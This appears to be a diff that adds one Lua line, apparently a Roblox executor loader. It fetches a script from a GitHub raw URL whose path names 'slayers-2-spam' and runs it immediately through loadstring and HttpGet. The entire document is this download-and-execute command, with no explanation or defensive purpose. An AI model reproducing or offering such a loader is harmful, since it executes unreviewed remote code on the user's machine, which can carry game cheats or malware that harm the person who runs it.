@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ForestBaseDuel/loaders/main/loaders/slayers-2-spam0-mqlmpqj2o5euwa.lua"))()
